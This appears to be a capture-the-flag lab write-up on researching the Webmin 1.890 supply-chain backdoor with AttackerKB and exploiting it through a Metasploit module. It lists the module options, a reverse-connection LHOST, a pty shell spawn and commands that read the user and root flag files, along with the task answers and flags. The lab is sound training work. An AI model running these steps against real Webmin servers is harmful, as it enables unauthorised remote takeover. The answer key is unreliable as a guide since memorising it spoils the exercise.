---
Learn how to leverage AttackerKB and learn about exploits in your workflow!
---

> For our purposes, think of AttackerKB as similar to Exploit-DB but with a higher degree of information surrounding vulnerabilities and the exploits therein associated with them. 

###### Technical Analysis
This was a supply chain attack: http://www.webmin.com/exploit.html. The backdoor was introduced in a version that was “exploitable” in the default install. Version 1.890 is the money. Anything after requires a non-default setting.

> On August 17th 2019, we were informed that a 0-day exploit that made use of the vulnerability had been released. In response, the exploit code was removed and Webmin version 1.930 created and released to all users. 

[Webmin backdoor](https://github.com/rapid7/metasploit-framework/pull/12219)

## Metasploit

```
msfconsole -q
```

```
search webmin
```

```backdoor
use 5
```

```
show options
```

```
set rhost 10.10.96.58
```

```
set ssl true
```

```
set rport 10000
```

```vpn-ip
set lhost 10.18.1.77
```

```
exploit
```

```
python -c "import pty;pty.spawn('/bin/bash')"
```

```
cat /home/dark/user.txt
```

```
cat /root/root.txt
```

- Scan the machine with Nmap. What non-standard service can be found running on the high-port? *Webmin*
- Further enumerate this service, what version of it is running? *1.890*
- Visit the webpage generated by this service. You should encounter an error due to SSL being present. Change the URL to use HTTPS and ignore the exception. After this, view the certificate. What hostname can we find on the cert details? On Firefox, you can view this by clicking on the 'i' in the URL, then the '>' in Connection, 'More Information', and then 'View Certificate' on the Security tab. *source*
- Adjust your /etc/hosts file accordingly to include the newly discovered hostname and revisit the webpage in question. Note, that this will confirm that the service we previously discovered using Nmap is correct. Once you've done this, move onto task three. *No answer needed*
- The AKB dashboard at the time of writing. Note, we won't have to log in for what we're doing. That being said, logging in (via GitHub OAuth) allows us to post and contribute to discussions surrounding vulnerabilities. *No answer needed*
- AKB allows us to search for various vulnerabilities via the search bar at the top right of the site. Search now for 'Webmin' and click on 'password_change.cgi' *No answer needed*
- Take a look through the Assessments for this vulnerability. As an attacker, we can use the information posted here by other members to determine how value an exploit might be and any tweaks we might have to make to exploit code. Similarly, as a defender we can leverage these comments to gain additional situational information for vulnerabilities, allowing us to gauge how quickly we need to patch them. Which version of Webmin is immediately vulnerable to this exploit? *1.890*
- What type of attack was this? Note, we're looking for how this was added to the code for Webmin, not how this results in remote code execution (RCE). *supply chain*
- Can you find a link to a post on the webmin's website explaining what happened? What day was Webmin informed of an 0day exploit? *August 2019 17th*
- Last but certainly not least, let's find the link to our exploit. We can see in the Assessments that a Metasploit module was added for this backdoor. What pull number was this added in? *12219*
- Launch Metasploit now as we'll be leveraging the Metasploit module for this exploit. *No answer needed*
- With Metasploit open, search for and select the exploit we previously investigated. *No answer needed*
- Now that we've selected our exploit, set the options provided appropriately. Beyond RHOSTS and LHOST, what is the third option we must set to 'True'? *ssl*
-  Run the exploit. What is the user flag? *THM{SUPPLY_CHAIN_COMPROMISE}*
- How about the root flag? *THM{UPDATE_YOUR_INSTALL}*











